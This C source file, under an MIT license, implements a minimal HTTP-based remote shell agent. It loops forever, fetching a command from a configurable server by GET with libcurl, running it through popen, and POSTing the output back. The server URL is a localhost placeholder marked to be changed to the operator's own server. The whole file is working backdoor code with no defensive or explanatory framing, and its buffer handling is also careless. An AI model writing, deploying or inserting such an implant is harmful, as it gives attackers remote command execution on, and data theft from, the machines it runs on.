/*
 * MIT License
 *
 * Copyright (c) 2024 Ivan Nikolskiy
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <curl/curl.h>

#define MAX_BUFFER 1024

// Function to write the response data from GET request
size_t write_callback(void *ptr, size_t size, size_t nmemb, char *data)
{
    size_t total;

    total = size * nmemb;

    if (total < MAX_BUFFER)
    {
        memcpy(data, ptr, total);
        data[total] = '\0'; // Null terminate the string
    }

    return total;
}

// Function to send the POST request
void send_post_request(const char *url, const char *data)
{
    CURL *curl;
    CURLcode res;
    struct curl_slist *headers;

    headers = NULL;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl)
    {
        headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK)
        {
            fprintf(stderr, "POST request failed: %s\n", curl_easy_strerror(res));
        }

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }

    curl_global_cleanup();
}

int main()
{
    CURL *curl;
    CURLcode status;

    char get_url[] = "http://127.0.0.1:8080/"; // Change to your server's URL
    char post_url[] = "http://127.0.0.1:8080/"; // Change to your server's URL

    char command[MAX_BUFFER];
    char output[MAX_BUFFER];
    char *cmd_output;

    FILE *fp;
    size_t bytes_read;

    // Initialize cURL
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl)
    {
        curl_global_cleanup();
        return 1;
    }

    while (1)
    {
        // Send GET request to get command
        curl_easy_setopt(curl, CURLOPT_URL, get_url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, command);
        status = curl_easy_perform(curl);

        if (status != CURLE_OK)
        {
            fprintf(stderr, "GET request failed: %s\n", curl_easy_strerror(status));
            break;
        }

        // Execute the command using popen
        fp = popen(command, "r");
        if (fp == NULL)
        {
            perror("popen failed");
            break;
        }

        memset(output, 0, sizeof(output));

	    // Read the command output
	    while ((bytes_read = fread(output, 1, sizeof(output) - 1, fp)) > 0)
		{
   			send_post_request(post_url, output);
   			memset(output, 0, sizeof(output));
		}

        // Send POST request with the command output
        send_post_request(post_url, output);
    }

    curl_easy_cleanup(curl);
    curl_global_cleanup();

    return 0;
}
